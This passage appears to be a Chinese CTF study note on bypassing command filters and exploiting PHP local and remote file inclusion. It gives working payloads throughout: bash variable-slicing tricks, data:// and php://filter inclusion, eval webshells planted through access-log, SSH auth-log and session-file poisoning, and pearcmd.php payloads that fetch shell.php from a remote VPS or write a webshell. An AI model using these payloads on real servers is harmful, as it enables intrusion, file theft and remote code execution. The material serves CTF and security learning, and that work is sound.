的版本号。\n- **`$HOSTNAME`**：当前主机名。\n- **`$UID`**：当前用户的用户 ID。\n\n通过以上变量其实我们就可以知道一些绕过就是跟变量有关的例如空格绕过就是利用了$IFS的作用\n\n### $PATH环境变量切割构造字符\n\n首先使用echo去输出我们的环境变量，然后从环境变量的内容中找出我们需要的字符去进行拼接\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot# echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot7# echo ${PATH:0:10}\n/usr/local\n这里可以看到我们是可以通过范围去取用环境变量中的单个字符然后进行拼接的\n```\n\n### $PWD环境变量切割构造字符\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# echo ${PWD}\n/var/www/html\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# echo ${PWD:0:1}\n/\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# echo ${PWD:0:3}\n/va\n也是可以通过切割去获取字符的\n```\n\n但是如果碰到题目过滤了数字，就需要另外构造了，例如linux可以利用`~`获得变量的最后几位（从最后开始获取），使用取反号时，任何字母等同于数字0。\n\n例如我们为了构造读取文件的命令nl\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# echo ${PWD:~A}\nl\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# echo ${PATH:~A}\nn\n```\n\n这里可以看到`${PATH:~A}${PWD:~A}`表示的就是`PATH`的最后一个字母和`PWD`的最后一个字母，组合起来就是nl。\n\n那我们如果读取flag.php的话就是\n\n```\n${PATH:~A}${PWD:~A} flag.php\n```\n\n相当于：`nl flag.php`\n\n这里借师傅的一张图，放一些常用的构造字符的方法\n\n![image-20250317164402702](../image/achieve/202411/命令执行--ctfshow/image-20250317164402702.png)\n\n这里的话可以根据不同的变量进行构造，构造出想要的字符，例如我们希望使用/bin/cat去读取文件，那么我们可以构造/???/??t或者/???/?a?\n\n```\n${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}}\n/???/??t\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}?\n/???/?a?\n```\n\n又或者我们想要构造/bin/bash64\n\n```\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM}\nRANDOM是一个随机数变量，返回一个随机整数（范围是 0 到 32767）。然后加上#号的话表示的是该变量的值的长度，例如${#1234}的结果就是4\n```\n\n这里积累了一个奇妙的姿势，就是通过变量返回数字\n\n利用`$?`，获取上一条命令执行结束后的返回值，`0`代表成功，`非0`代表失败。非0返回值的命令如下\n\n```\n\"OS error code   1:  Operation not permitted\"\n\"OS error code   2:  No such file or directory\"\n\"OS error code   3:  No such process\"\n\"OS error code   4:  Interrupted system call\"\n\"OS error code   5:  Input/output error\"\n\"OS error code   6:  No such device or address\"\n\"OS error code   7:  Argument list too long\"\n\"OS error code   8:  Exec format error\"\n\"OS error code   9:  Bad file descriptor\"\n\"OS error code  10:  No child processes\"\n\"OS error code  11:  Resource temporarily unavailable\"\n\"OS error code  12:  Cannot allocate memory\"\n\"OS error code  13:  Permission denied\"\n\"OS error code  14:  Bad address\"\n\"OS error code  15:  Block device required\"\n\"OS error code  16:  Device or resource busy\"\n\"OS error code  17:  File exists\"\n\"OS error code  18:  Invalid cross-device link\"\n\"OS error code  19:  No such device\"\n\"OS error code  20:  Not a directory\"\n\"OS error code  21:  Is a directory\"\n\"OS error code  22:  Invalid argument\"\n\"OS error code  23:  Too many open files in system\"\n\"OS error code  24:  Too many open files\"\n\"OS error code  25:  Inappropriate ioctl for device\"\n\"OS error code  26:  Text file busy\"\n\"OS error code  27:  File too large\"\n\"OS error code  28:  No space left on device\"\n\"OS error code  29:  Illegal seek\"\n\"OS error code  30:  Read-only file system\"\n\"OS error code  31:  Too many links\"\n\"OS error code  32:  Broken pipe\"\n\"OS error code  33:  Numerical argument out of domain\"\n\"OS error code  34:  Numerical result out of range\"\n\"OS error code  35:  Resource deadlock avoided\"\n\"OS error code  36:  File name too long\"\n\"OS error code  37:  No locks available\"\n\"OS error code  38:  Function not implemented\"\n\"OS error code  39:  Directory not empty\"\n\"OS error code  40:  Too many levels of symbolic links\"\n\"OS error code  42:  No message of desired type\"\n\"OS error code  43:  Identifier removed\"\n\"OS error code  44:  Channel number out of range\"\n\"OS error code  45:  Level 2 not synchronized\"\n\"OS error code  46:  Level 3 halted\"\n\"OS error code  47:  Level 3 reset\"\n\"OS error code  48:  Link number out of range\"\n\"OS error code  49:  Protocol driver not attached\"\n\"OS error code  50:  No CSI structure available\"\n\"OS error code  51:  Level 2 halted\"\n\"OS error code  52:  Invalid exchange\"\n\"OS error code  53:  Invalid request descriptor\"\n\"OS error code  54:  Exchange full\"\n\"OS error code  55:  No anode\"\n\"OS error code  56:  Invalid request code\"\n\"OS error code  57:  Invalid slot\"\n\"OS error code  59:  Bad font file format\"\n\"OS error code  60:  Device not a stream\"\n\"OS error code  61:  No data available\"\n\"OS error code  62:  Timer expired\"\n\"OS error code  63:  Out of streams resources\"\n\"OS error code  64:  Machine is not on the network\"\n\"OS error code  65:  Package not installed\"\n\"OS error code  66:  Object is remote\"\n\"OS error code  67:  Link has been severed\"\n\"OS error code  68:  Advertise error\"\n\"OS error code  69:  Srmount error\"\n\"OS error code  70:  Communication error on send\"\n\"OS error code  71:  Protocol error\"\n\"OS error code  72:  Multihop attempted\"\n\"OS error code  73:  RFS specific error\"\n\"OS error code  74:  Bad message\"\n\"OS error code  75:  Value too large for defined data type\"\n\"OS error code  76:  Name not unique on network\"\n\"OS error code  77:  File descriptor in bad state\"\n\"OS error code  78:  Remote address changed\"\n\"OS error code  79:  Can not access a needed shared library\"\n\"OS error code  80:  Accessing a corrupted shared library\"\n\"OS error code  81:  .lib section in a.out corrupted\"\n\"OS error code  82:  Attempting to link in too many shared libraries\"\n\"OS error code  83:  Cannot exec a shared library directly\"\n\"OS error code  84:  Invalid or incomplete multibyte or wide character\"\n\"OS error code  85:  Interrupted system call should be restarted\"\n\"OS error code  86:  Streams pipe error\"\n\"OS error code  87:  Too many users\"\n\"OS error code  88:  Socket operation on non-socket\"\n\"OS error code  89:  Destination address required\"\n\"OS error code  90:  Message too long\"\n\"OS error code  91:  Protocol wrong type for socket\"\n\"OS error code  92:  Protocol not available\"\n\"OS error code  93:  Protocol not supported\"\n\"OS error code  94:  Socket type not supported\"\n\"OS error code  95:  Operation not supported\"\n\"OS error code  96:  Protocol family not supported\"\n\"OS error code  97:  Address family not supported by protocol\"\n\"OS error code  98:  Address already in use\"\n\"OS error code  99:  Cannot assign requested address\"\n\"OS error code 100:  Network is down\"\n\"OS error code 101:  Network is unreachable\"\n\"OS error code 102:  Network dropped connection on reset\"\n\"OS error code 103:  Software caused connection abort\"\n\"OS error code 104:  Connection reset by peer\"\n\"OS error code 105:  No buffer space available\"\n\"OS error code 106:  Transport endpoint is already connected\"\n\"OS error code 107:  Transport endpoint is not connected\"\n\"OS error code 108:  Cannot send after transport endpoint shutdown\"\n\"OS error code 109:  Too many references: cannot splice\"\n\"OS error code 110:  Connection timed out\"\n\"OS error code 111:  Connection refused\"\n\"OS error code 112:  Host is down\"\n\"OS error code 113:  No route to host\"\n\"OS error code 114:  Operation already in progress\"\n\"OS error code 115:  Operation now in progress\"\n\"OS error code 116:  Stale NFS file handle\"\n\"OS error code 117:  Structure needs cleaning\"\n\"OS error code 118:  Not a XENIX named type file\"\n\"OS error code 119:  No XENIX semaphores available\"\n\"OS error code 120:  Is a named type file\"\n\"OS error code 121:  Remote I/O error\"\n\"OS error code 122:  Disk quota exceeded\"\n\"OS error code 123:  No medium found\"\n\"OS error code 124:  Wrong medium type\"\n\"OS error code 125:  Operation canceled\"\n\"OS error code 126:  Required key not available\"\n\"OS error code 127:  Key has expired\"\n\"OS error code 128:  Key has been revoked\"\n\"OS error code 129:  Key was rejected by service\"\n\"OS error code 130:  Owner died\"\n\"OS error code 131:  State not recoverable\"\n\"MySQL error code 132: Old database file\"\n\"MySQL error code 133: No record read before update\"\n\"MySQL error code 134: Record was already deleted (or record file crashed)\"\n\"MySQL error code 135: No more room in record file\"\n\"MySQL error code 136: No more room in index file\"\n\"MySQL error code 137: No more records (read after end of file)\"\n\"MySQL error code 138: Unsupported extension used for table\"\n\"MySQL error code 139: Too big row\"\n\"MySQL error code 140: Wrong create options\"\n\"MySQL error code 141: Duplicate unique key or constraint on write or update\"\n\"MySQL error code 142: Unknown character set used\"\n\"MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table\"\n\"MySQL error code 144: Table is crashed and last repair failed\"\n\"MySQL error code 145: Table was marked as crashed and should be repaired\"\n\"MySQL error code 146: Lock timed out; Retry transaction\"\n\"MySQL error code 147: Lock table is full;  Restart program with a larger locktable\"\n\"MySQL error code 148: Updates are not allowed under a read only transactions\"\n\"MySQL error code 149: Lock deadlock; Retry transaction\"\n\"MySQL error code 150: Foreign key constraint is incorrectly formed\"\n\"MySQL error code 151: Cannot add a child row\"\n\"MySQL error code 152: Cannot delete a parent row\"\n```\n\n这种情况适用于我们平时想通过构造数字但是没什么思路的时候，但感觉这是有点偏的一个思路\n\n### 自定义环境变量绕过\n\n这是一个比较常见的姿势了，当我们的环境禁用了很多命令的时候可以利用这个去桡骨\n\n```\na=l;b=s;$a$b\n```\n\n本地测试一下\n\n```\nroot@VM-16-12-ubuntu:/# ls\nbin   data  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr\nboot  dev   home  lib32  libx32  media       opt  root  sbin  srv   tmp  var\nroot@VM-16-12-ubuntu:/# a=l;b=s;$a$b\nbin   data  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr\nboot  dev   home  lib32  libx32  media       opt  root  sbin  srv   tmp  var\n```\n\n说明这种拼接方式是可以的，但是目前限制条件我还没研究到，后面再补上\n\n# 文件包含姿势\n\n漏洞产生条件\n\n如果文件包含函数没有经过严格的过滤或者定义，并且参数可以被用户控制，这样就有可能包含恶意的文件。\n\nPHP文件包含函数有以下四种：\n\n- include\n- inclued_once\n- require\n- require_once\n\n`require()/require_once()`：如果在包含过程中有错，那么直接退出，不执行进一步操作。\n`include()/include_once()`: 如果在包含过程中出错，只会发出警告\n\n加上后缀_once的作用区别就是：如果文件已经包含过了，那么不会再次包含\n\n## 无限制本地文件包含\n\ninclude($a)就是没有为包含文件指定特定的前缀或扩展名\n\n**include函数**就是包含文件的函数，这里的话会把$a的内容包含进来\n\n举个例子，首先我们先创建一个1.php\n\n```php\n<?php\nif(isset($_GET['a'])){\n    $a = $_GET['a'];\n    include($a);\n}else {\n    highlight_file(__FILE__);\n}\n```\n\n然后创建一个2.php\n\n```php\n<?php\n\tphpinfo();\n\t?>\n```\n\n接着对参数a传入2.php就会执行phpinfo函数\n\n![image-20250306180528089](../image/achieve/202411/RCE的bypass/image-20250306180528089.png)\n\n换成别的文件类型也是一样的，例如我把后缀换成jpg\n\n![image-20250306180648047](../image/achieve/202411/RCE的bypass/image-20250306180648047.png)\n\n可以看出**，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来**。\n\n所以我们可以把参数指向的文件内容嵌入到其中就可以使得代码成功解析，达到一个rce的效果\n\n我们可以用data伪协议\n\n### data伪协议文件包含\n\n使用的条件:\n\nallow_url_fopen : on \n\nallow_url_include :on\n\n![image-20250306182827429](../image/achieve/202411/RCE的bypass/image-20250306182827429.png)\n\ndata:// 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行\n\n我们拿刚刚的试一下\n\npayload\n\n```\n?a=data://text/plain,<?php phpinfo();?>\n解释一下\ndata:：这是数据 URL 的前缀，告诉浏览器或应用程序后续的数据是以数据方式嵌入的，而不是指向外部资源。\ntext/plain：这是 MIME 类型，表示数据的格式。在这个例子中，text/plain 表示数据是普通文本。MIME 类型用于告知接收端如何处理数据。\n<?php phpinfo();?>：这是实际的数据内容。在这里，这是一个 PHP 代码片段，它调用了 phpinfo() 函数。该函数用于输出有关当前 PHP 环境和配置的详细信息，包括 PHP 版本、加载的扩展、服务器信息、PHP 配置选项等。\n```\n\n![image-20250306181247298](../image/achieve/202411/RCE的bypass/image-20250306181247298.png)\n\n这里没执行成功是因为php配置的问题\n\ndata协议使用的条件:allow_url_fopen:on allow_url_include :on\n\n改一下php.ini文件就可以了\n\n![image-20250306182241606](../image/achieve/202411/RCE的bypass/image-20250306182241606.png)\n\n可以看到我们传入的代码被正常解析了，另外用base64编码也是可以的\n\n```\n?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==\n```\n\n### filter协议文件包含\n\n使用条件：\n\nallow_url_include = On\n\nphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\n\n简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。\n\n**php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行**。我们试一下对2.php文件进行包含\n\n```\npayload\n?a=php://filter/resource=2.php\n```\n\n![image-20250306191802512](../image/achieve/202411/RCE的bypass/image-20250306191802512.png)\n\n这时候可以看到已经成功执行了里面的phpinfo()函数。\n\n但是我们一般也可以对其进行编码，让其不执行。从而导致任意文件读取。\n\n例如我们对刚刚的2.php进行读取\n\n![image-20250306191618115](../image/achieve/202411/RCE的bypass/image-20250306191618115.png)\n\npayload\n\n```\n?a=php://filter/read=convert.base64-encode/resource=2.php\n```\n\n`convert.base64-encode` 表示将数据进行 Base64 编码。\n\n`resource=2.php`：这部分指定了要处理的资源\n\n但是这里的话需要注意，filter伪协议不能搭配我们的通配符去使用，对于 `php://filter` 这种用于数据过滤和流处理的伪协议，一般不支持通配符操作。\n\n### input协议文件包含\n\nphp://input 是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。\n\n所以我们可以对参数传入php://input，然后post传入PHP恶意代码\n\n另外我们也可以通过文件包含去读取文件内容\n\n### 获取敏感文件\n\n例如\n\n```\n?file=../../../../etc/passwd\n```\n\n我们试着去读取一个文件\n\n![image-20250306185618976](../image/achieve/202411/RCE的bypass/image-20250306185618976.png)\n\n这里我把3.txt放在了1.php的上一级目录中，这时候也是可以读到的\n\n## 有限制本地文件包含漏洞\n\n**include($c.\".php\")**文件包含是代码中为包含文件指定了特定的前缀或者拓展名，这时候我们就需要对扩展名进行过滤绕过\n\n这行代码的作用是将一个PHP文件的内容包含（或插入）到当前执行的脚本中。这里$c 是一个变量，它的值会被附加到字符串 “.php” 之前，从而构成要包含文件的完整路径（或至少是文件名，如果文件位于当前工作目录中）\n\n例如我们传入test，那么实际上就会包含并执行test.php的文件，我们试一下\n\n先在web目录中创建一个2.php文件\n\n```\n<?php phpinfo();?>\n```\n\n然后传入2\n\n![image-20250306184455805](../image/achieve/202411/RCE的bypass/image-20250306184455805.png)\n\n出来了，证明猜想是对的\n\n那这时候怎么绕过呢?\n\n常见的过滤绕过方式有三种：\n\n### %00截断文件包含\n\n利用条件\n\n这个漏洞的使用必须满足如下条件\n\n- magic_quotes_gpc=off\n- PHP版本低于5.3.4\n\n跟之前做的那个文件上传的00截断是一样的，就是把后缀名给截断掉，然后就可以像正常的无限制本地包含一样去进行\n\n### 路径长度截断文件包含\n\n操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。\n\n- Windows下最大路径长度为256B\n- Linux下最大路径长度为4096B\n\n但是这个感觉比较麻烦\n\n### 点号截断文件包含\n\n漏洞利用条件\n\n点号截断包含**只使用与Windows系统**，点号的长度大于256B的时候，就可以造成拓展名截断\n\n另外的话我们讲一下关于data伪协议在这里面的作用\n\n**data://text/plain, 这样就相当于执行了php语句, .php 因为前面的php语句已经闭合了**，所以后面的.php会直接显示在屏幕上不会对传入的代码造成影响\n\n### require_once 绕过不能重复包含文件的限制\n\nphp的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，如果代码中已经执行过require_once('1.php')，这个已经包含的文件就不能再次require_once了，那我们应该如何让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容呢？\n\n在这里有个小知识点，`/proc/self`指向当前进程的`/proc/pid/`，`/proc/self/root/`是指向`/`的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，例如payload\n\n```\nphp://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/1.php\n```\n\n接下来我们仔细分析下，这里就是关于我们上面所说的路径的解析，也就是路径长度截断文件包含\n\n简单来说，在检查传入的文件的解析过程中，是从后往前去匹配的，也就是递归机制，递归机制是从后往前，`/var/www/html/1.php -> /var/www/html -> /var/www`。\n\n而这个递归调用是`tsrm_realpath_r`去执行的，`tsrm_realpath_r`是用来解析真实路径的\n\n还有一个相关的函数php_sys_lstat\n\nphp_sys_lstat()是用来获取一些文件相关的信息，成功执行时，返回0。失败返回-1，并且会设置`errno`，因为之前符号链接过多，所以`errno`就都是`ELOOP`，符号链接的循环数量真正取决于`SYMLOOP_MAX`，这是个`runtime-value`，它的值不能小于`_POSIX_SYMLOOP_MAX`。\n\n所以一大堆`/proc/self/root`拼一起，从后往前倒，递归调用`tsrm_real_path_r`，直到`php_sys_lstat`返回`0`，即成功。\n\n所以在我们的payload中在/var/www/html/1.php前面的软链接均不会生效，且由于超过了长度限制会被截断，最后只返回/var/www/html/1.php的结果\n\n## 日志文件包含\n\n### 中间件日志文件包含\n\n服务器的中间件都会有日志记录的功能，如果开启了日志记录功能，用户访问的日志就会存储到不同服务的相关文件。\n\n如果日志文件的位置是默认位置或者是可以通过其他方法获取，就可以通过访问日志将恶意代码写入到日志文件中去，然后通过文件包含漏洞包含日志中的恶意代码，获得权限。\n\n利用条件:\n\n- web中间件日志文件的存储位置已知，并且具有可读权限\n\n对于Apache，日志存放路径：/var/log/apache/access.log\n\n对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log。Nginx中的日志分两种，一种是error.log，一种是access.log。error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期间的处理流程相关的信息；access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。\n\n在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log\n\n所以日志文件包含的做法有两种\n\n- 将恶意代码直接写入日志\n\n因为日志文件会记录我们的每一个请求的内容，例如访问假设访问URL：http://192.168.1.2/api\n发现会在日志文件中有如下内容：\n\n```csharp\n[root@wanth3f1ag]#less /var/log/httpd/access_log\n192.168.1.200 - - [09/Aug/2021:19:31:20 +0800] \"GET /api HTTP/1.1\" 200 86....\n```\n\n这时候我们添加恶意代码\n\n```\nhttp://192.168.1.2/api/<?php 一句话木马?>\n```\n\n这时候再查看日志文件就会发现内容已经写入\n\n```\n[root@aaa]#less /var/log/httpd/access_log\n192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] \"GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1\" 404 826....\n```\n\n但是由于浏览器的URL编码功能，导致传入的代码不可用，所以我们可以通过bp抓包去进行写入，这也不会被浏览器进行URL编码\n\n- UA头文件包含\n\n做法:\n\n- 传参访问日志文件目录(有时候需要目录穿越)\n- 在UA头写入php代码，然后发送请求，并在日志文件中找到回显信息\n\n这里为什么要在UA头写恶意代码呢？是因为本地日志文件可以看到nginx服务器中记录的是每次请求user-agent报文，那么我们可以通过包含nginx'服务器的日志文件，然后在user-agent服务器中写入木马语句进行注入，这也可以避免有些时候对参数进行了关键字的过滤导致不能直接传马的情况\n\n### SSH日志文件包含\n\n利用条件：\n\n- SSH日志路径已知，并且具有可读权限\n\nSSH日志文件的默认路径为`/var/log/auth.log`\n\n**Auth 日志文件**：\n\n- **位置**：通常在 `/var/log/auth.log` 或 `/var/log/secure`。\n- **内容**：记录了认证和授权相关的信息，比如登录成功、失败、密码尝试等。\n\n当我们发现一个本地文件包含漏洞时，可以把ssh连接的用户名写成webshell，然后包含/var/log/auth.log获取服务器权限：\n\n```\nssh '<?php eval($_GET['k']); ?>'@172.18.101.100\n```\n\n访问http://192.168.1.1?file=/var/log/auth.log&k=whoami发现成功执行\n\n## session文件包含\n\n### Session的工作原理\n\n在PHP中，Session是用来保存用户数据的一种方式。当使用session_start()函数初始化Session时，PHP会在服务器上的特定路径下创建一个Session文件。这个路径可以在php.ini文件中通过`session.save_path`指定。Session文件通常以`sess_`为前缀，后面跟着一个Session ID。当用户再次访问网站时，服务器会通过这个Session ID来找到对应的Session文件，并加载其中的数据。\n\n利用条件\n\nsession文件包含的利用条件有两个：\n\n- Session的存储位置可以获取\n- Session的内容可控\n\n一般通过以下两种方式获取session的存储位置：\n\n- 通过phpinfo的信息获取session的存储位置。\n  通过phpinfo的信息获取`session.save_path`\n- 通过猜测默认的session存储位置进行尝试\n  通常Linux中的Session的默认存储位置在`/var/lib/php/session`目录下\n\nsession常见存储路径:\n\n```\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsession文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。\n```\n\n我们先看一下在php.ini中的几个关于session的配置\n\n`session.upload_progress.enabled = on`\n\n- **说明**：启用上传进度功能。当设置为 `on` 时，PHP 将允许在文件上传过程中追踪进度。需要与其他相关配置一起使用。\n\n`session.upload_progress.cleanup = on`\n\n- **说明**：启用上传进度的清理功能。当设置为 `on` 时，PHP 会在上传完成后自动清理与上传进度相关的临时 Session 数据。这样可以防止过多的进度信息占用内存。\n\n`session.upload_progress.prefix = \"upload_progress_\"`\n\n- **说明**：设置上传进度 Session 变量的前缀。PHP 会创建一个以该前缀开头的 Session 变量来存储上传进度信息。默认情况下，上传进度变量的名称会是 `upload_progress_[session_id]` 的形式。\n\n`session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"`\n\n- **说明**：设置用于访问上传进度信息的 Session 变量的名称。默认情况下，这个名称是 `PHP_SESSION_UPLOAD_PROGRESS`，可以在 JavaScript 或其他客户端代码中使用该名称来获取上传进度。\n\n`session.upload_progress.freq = \"1%\"`\n\n- **说明**：设置上传进度更新的频率。该选项指定了上传进度的信息更新频率，值为 `1%` 表示每当上传进度达到 1% 时，PHP 会更新进度信息。可以设置为更高的比例，以减少 Session 的更新次数。\n\n`session.upload_progress.min_freq = \"1\"`\n\n- **说明**：设置更新进度信息的最小频率（以秒为单位）。设置为 `1` 表示每秒至少更新一次上传进度信息。此选项可以帮助控制频繁更新所带来的性能开销。\n\n**`enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中** \n\n### 如何创建session文件呢。\n\n如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。\n\n但session还有一个默认选项，`session.use_strict_mode=Off`，这个配置决定了我们是否可以随意更改session，如果这个配置是打开的，比如，服务器端给的`PHPSESSID=wang`,此时我们**在Cookie里更改PHPSESSID=zhang**，服务端那边是不会认的,生成的文件是sess_wang。但例如这个配置关闭的话，我们就可以抓包更改PHPSESSID=zhang，此时在临时目录下就会生成sess_zhang临时文件。\n\n同时上面也讲过了**SESSION_UPLOAD_PROGRESS**，既然session会被存储到临时文件中且又会往session文件中写入内容，那么如果我们能控制写入的内容，就能往目标主机上写马了，再配合文件包含漏洞就可以达到我们想要的效果。\n\n事实上**SESSION_UPLOAD_PROGRESS**会把post的内容写入到session文件,通过控制post的内容即可写马\n\n那么问题就来了,为什么不直接往session文件里面写马?因为虽然我们能控制session文件的名字,但是我们并不能控制它的内容,只能使用**SESSION_UPLOAD_PROGRESS**去实现.\n\n如果存在本地文件包含漏洞，就可以通过传参写入恶意代码到Session文件当中去，然后通过文件包含漏洞执行rce\n\n### **攻击步骤**\n\n- 将恶意代码写入PHP_SESSION_UPLOAD_PROGRESS下\n- 攻击者可以通过PHPinfo或者猜测到session存放的位置\n- 通过开发者模式可以获得文件名称\n- 通过本地文件包含漏洞可以解析session文件达到攻击的目的\n\n`cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要\n\n如果session.upload_progress.cleanup被打开了,这就意味着**SESSION_UPLOAD_PROGRESS**往session中被写入的内容会被即时清除,这时候我们就需要利用利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含\n\n## 无限制远程文件包含\n\n无限制远程文件包含是指包含文件的位置并不在本地服务器，而是通过URL的形式包含到其他服务器上的文件，以及执行文件中的恶意代码\n\n利用条件\n\n```\nallow_url_fopen=on\nallow_url_include=on\n```\n\n接下来我们看一下怎么实现的\n\n首先在本地的web目录中创建一个php文件\n\n```php\n//1.php\n<?php\n\t$file=$_GET['file'];\n\tinclude $file;\n?>\n```\n\n然后在我们的云服务器上的web目录同样创建一个php文件\n\n```php\n//1.php\n<?php phpinfo(); ?>\n```\n\n然后进行远程包含\n\n```\nhttp://127.0.0.1/1.php?file=http://156.238.233.87/1.php\n```\n\n![image-20250314174711424](../image/achieve/202411/RCE的bypass/image-20250314174711424.png)\n\n成功包含，如果把服务器中的文件后缀改成其他的也是一样可以当成php代码去执行的\n\n## 有限制远程文件包含\n\n有限制的远程文件包含是代码中存在特定的前缀和后缀.php /.html 等拓展名过滤的时候，攻击者需要绕过前缀或者拓展名过滤，才能远程执行URL代码\n\n通常有限制的远程文件包含可以通过问号、井号、空格绕过\n\n### 通过问号绕过\n\n可以在问号后面添加html字符串，问号后面的拓展名会被当做查询，从而绕过过滤\n\n```\nhttp://127.0.0.1/1.php?file=http://156.238.233.87/1.php?\n```\n\n### 通过井号绕过\n\n可以在#后面添加HTML字符串，#会截断后面的拓展名，从而绕过拓展名过滤.#的URL编码为%23\n\n```\nhttp://127.0.0.1/1.php?file=http://156.238.233.87/1.php%23\n```\n\n### 通过空格绕过\n\n```\nhttp://www.abc.com/file.php?filename=http://192.168.2.1/php.txt%20\n```\n\n## 利用pearcmd.php从LFI到getshell\n\n条件:register_argc_argv=On\n\n![image-20211220194003580](../image/achieve/202411/PHP小妙招/71f52d2105a77d98bb8258abc734614c.png)\n\npear可以用来拉取远程的代码\n\n```\npear install -R /tmp http://vps/shell.php\n```\n\n假如我的vps上有一个文件shell.php\n\n```php\n<?php\necho \"aaa\";\n?>\n```\n\n如果你远程服务器中/var/www/html中php代码可以被解析，那么你使用pear拉取到的shell.php就是\n\n```\naaa\n```\n\n如果远程服务器上的php没有被解析，拉取到的shell.php就是\n\n```php\n<?php\necho \"aaa\";\n?>\n```\n\n所以，**当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。**\n\n如果靶机出网\n\n```php\n//test.php\n<?php\ninclude($_GET['file']);\n?>\n```\n\n我们尝试拉取远程服务器的shell.php到靶机的/tmp目录下\n\npayload\n\n```\nhttp://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://vps/shell.php\n//shell就是我们的一句话木马\n```\n\n然后文件包含shell.php同时传参cmd即可\n\n解释payload\n\n- **`?file=/usr/local/lib/php/pearcmd.php`**\n  - 指定 `pearcmd.php` 文件的路径。\n  - `pearcmd.php` 是 PEAR（PHP 扩展和应用库）的命令行工具。\n- **`&+install+-R+/tmp+http://vps/shell.php`**\n  - 这是 `pearcmd.php` 的 `install` 命令的参数。\n  - `install`：安装指定的包。\n  - `-R /tmp`：将安装的文件保存到 `/tmp` 目录。\n  - `http://vps/shell.php`：从远程服务器下载的恶意文件。\n\n如果靶机不出网，我们可以写一句话木马进hello.php\n\n```\nhttp://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['shell']);?>+/var/www/html/shell.php\n```\n\n解释payload\n\n- **`?+config-create+`**\n  - 这是 PHP 的 `pearcmd.php` 工具的一个参数，用于创建配置文件。\n  - `pearcmd.php` 是 PEAR（PHP 扩展和应用库）的命令行工具。\n- **`/&file=/usr/local/lib/php/pearcmd.php&/`**\n  - 指定 `pearcmd.php` 文件的路径。\n  - 如果服务器上存在 `pearcmd.php`，这段代码会尝试调用它。\n- **`<?=eval($_POST[1])?>`**\n  - 这是一个 PHP 短标签，用于执行 `eval($_POST[1])`。\n  - `eval` 函数会执行传入的 PHP 代码，`$_POST[1]` 是从 POST 请求中获取的参数。\n  - 这段代码的目的是将恶意 PHP 代码写入目标文件。\n- **`+/tmp/hello.php`**\n  - 指定目标文件的路径，即 `/tmp/hello.php`。\n  - 